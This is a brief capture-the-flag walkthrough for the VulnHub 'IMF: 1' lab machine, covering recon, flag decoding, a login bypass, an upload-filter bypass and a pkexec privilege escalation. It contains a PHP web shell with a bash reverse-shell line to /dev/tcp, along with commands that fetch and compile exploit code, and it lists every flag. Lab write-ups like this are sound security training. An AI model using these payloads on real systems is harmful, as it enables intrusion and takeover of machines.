
 IMF: 1 Walkthrough

**VulnHub Link:** [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/)
**Difficulty:** Medium
**Release Date:** 30 Oct 2016

## 1.Reconnaissance
```bash
nmap -A -O -T4 -P -sV 192.168.100.171

sudo echo "192.168.100.171    imf.local" > /etc/hosts
```

## 2. Enumaration 
```bash
dirb http://imf.local
```

from contact us page , view page source and observe flag1
flag1{YWxsdGhlZmlsZXM=

from the same page source observe js sections and combine them 
<script src="ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ=="</script>

```bash
echo "ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ" | base64 -d
```
flag2{aW1mYWRtaW5pc3RyYXRvcg==} found

```bash
echo "aW1mYWRtaW5pc3RyYXRvcg==" | base64 -d                  
imfadministrator
```

imf.local/imfadministrator found

opening burp suite and changing pass to pass[] and flag3 captured

flag3{Y29udGludWVUT2Ntcw==}

```bash
echo "Y29udGludWVUT2Ntcw==" | base64 -d
```
from webpage whiteboard.jpg

in zxing , whiboard.jpg showed flag4

flag4{dXBsb2Fkcjk0Mi5waHA=} 

```bash
echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d
```
and we obtain upload php file 

and found out that we can only upload image files

in burpsuite , we upload shell.php which you can download
```bash
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/IMF%3A1/shell.php
```
we upload this php file and in repeater -->
content-type --> image/gif
filename --> shell.gif

but we have to change content of php file to

<?php
    echo '<pre>';
    echo `id`;
    echo '</pre>';
?>

in response, we obtain something like 43nfi24276f

we write in url --> http://imf.local/imfadministrator/uploads/43nfi24276f.gif

we change it to -->

<?php
    echo '<pre>';
    echo `bash -i >& /dev/tcp/IP/PORT 0>&1`;
    echo '</pre>';
?>

good , www-data shell opened and flag5 captured.

flag5{YWdlbnRzZXJ2aWNlcw==}

## 3. Privilege Escalation

pkexec vulnerability found ---> pkexec version 0.105

```bash
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/IMF%3A1/exploit.c
wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/IMF%3A1/evil-so.c
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
```
AND BOOOM  Root flag captured.

flag6{R2gwc3RQcm90MGMwbHM=}
